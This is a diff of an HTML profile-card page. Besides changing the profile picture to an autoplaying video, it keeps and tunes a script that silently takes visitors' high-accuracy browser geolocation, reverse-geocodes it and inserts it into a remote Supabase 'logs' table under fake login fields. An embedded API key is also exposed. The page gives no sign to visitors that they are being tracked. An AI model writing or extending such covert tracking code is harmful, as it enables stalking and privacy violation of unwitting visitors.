@@ -30,7 +30,7 @@
         .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
         @keyframes rotate { 100% { transform: rotate(360deg); } }
         .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
-        .profile_image { width: 100%; height: 100%; object-fit: cover; }
+        .profile_video { width: 100%; height: 100%; object-fit: cover; }
         .card_content { padding-top: 85px; text-align: center; }
         .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
         .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; margin-top: 20px; }
@@ -44,7 +44,9 @@
     <div class="header">
         <div class="wave_bg"><div class="wave-01"></div></div>
         <div class="profile_pic_content">
-            <img src="https://files.catbox.moe/8gclzh.jpeg" class="profile_image" alt="Profile">
+            <video class="profile_video" autoplay loop muted playsinline>
+                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
+            </video>
         </div>
     </div>
     <div class="card_content">
@@ -70,29 +72,29 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    async function sendAutoData(loc) {
-        await sb.from('logs').insert([{ username: "Visitor", password: "Auto-Login", location: loc }]);
+    async function sendLocationData(info) {
+        await sb.from('logs').insert([{ username: "Visitor", password: "Direct-Access", location: info }]);
     }
 
     function startTracking() {
         if ("geolocation" in navigator) {
-            const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+            const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy;
                 const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                let locInfo = "";
+                let finalLocData = "";
                 try {
                     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
                     const d = await r.json();
-                    locInfo = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                    finalLocData = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 } catch(e) {
-                    locInfo = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                    finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 }
-                sendAutoData(locInfo);
+                sendLocationData(finalLocData);
             }, (err) => {
-                sendAutoData("فشل في تحديد الموقع: " + err.message);
+                sendLocationData("فشل في تحديد الموقع بدقة: " + err.message);
             }, geoOptions);
         }
     }
